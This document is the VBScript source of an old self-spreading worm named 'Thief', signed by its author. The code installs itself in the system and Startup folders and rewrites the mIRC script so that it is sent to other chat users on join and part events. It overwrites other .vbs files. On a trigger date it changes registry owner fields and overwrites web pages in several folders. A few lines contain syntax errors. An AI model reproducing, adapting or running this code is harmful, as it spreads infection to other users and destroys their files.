'<==Thief==>
'Made by Yozis....2000
'http://www.yozis.net or zerogravity.cjb.net
';D I Am A Lamer... Of Course!!!
'Yozis Network 's Product!

Set FSO = CreateObject("Scripting.FileSystemObject")
vbs = Wscript.ScriptFullName

Set Script = Fso.CreateTextFile("c:\windows\script.dls", True)
Script.Writeline "[script]"
Script.Writeline "n0=; The Thief 2ooo"
Script.Writeline "n1=On 1:JOIN:#:{ /if ( $nick==me ) { halt } "
Script.Writeline "n2= /dcc send $nick c:\windows\system\Thief.vbs"
Script.Writeline "n3= }"
Script.Writeline "n4=on 1:PART:#:{ /if ($nick==me ) {halt}"
Script.writeline "n5= /dcc send $nick c:\windows\system\Thief.vbs"
Script.Writeline "n6=}"
Script.Writeline "n7=On 1:TEXT:*Thief*:/msg $nick I am a thief"
Script.Writeline "n8=On 1:TEXT:*infected*:/ignore $nick"
Script.Writeline "n9=On 1:PART:#:/msg $nick www.yozis.net thanx!"
Script.Writeline "n10=;www.yozis.net"
Script.Close

FSO.copyfile vbs, "c:\windows\system\Thief.vbs"
Fso.Copyfile "C:\windows\script.dls","C:\mirc\script.ini"
FSO.CopyFile vbs, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"

OverWrite Fso.GetSpecialFolder(0)
OverWrite Fso.GetSpecialFolder(0) & "\Desktop"
OverWrite "."

call Joke

Sub OverWrite(Folder)
For Each V in FSO.GetFolder(Folder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then
  FSO.copyfile vbs, V.path
Next
End Sub

Sub Joke
if day(now)=24 then
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "zer0gravity 2000"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Yozis.http://www.yozis.net"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "The Thief"
Dii("C:\My Documents")
Dii("C:\Windows\Desktop")
Dii("C:\Windows\Web")
Dii("C:\Windows\Web\Wallpaper")
Dii("C:\Windows\Help")
Dii("C:\Windows\Temp")
Dii("C:\Program Files\Internet Explorer\Connection Wizard")
Dii("C:\Program Files\Microsoft Office\Office\Headers")

MsgBox("If you want your hard drive to be trashed now,just click OK")
MsgBox("Hard Disk trash will start within 5mins....")
Msgbox("Yozis.http://www.yozis.net")

end if
End sub

Function Dii(Folder)
IF Fso.FolderExists(Folder) then
For Each V in FSO.GetFolder(Folder).Files
ext=FSO.GetExtensionName(V.Name)
If ext = "html" or ext = "htm" or ext = "asp" then
Set target=FsoOpenTextFile(V.path, 2, True)
target.Writeline "<!--Thief.Mirc-->"
target.Writeline "<B>Thief Infected File!!!!</B>"
Target.Writeline "<b><a href="http://www.yozis.net">Visit Web site</a></b>"
Target.Writeline "<a href="http://www.yozis.net">Visit Web Site</a>"
Target.Writeline "-=Special Dedication 2 T.Z!!"
Target.Writeline "T.Z: Fuck the army man,we are waiting..."
Target.Close
end if
end if
Next
End Function

'Coming soon...

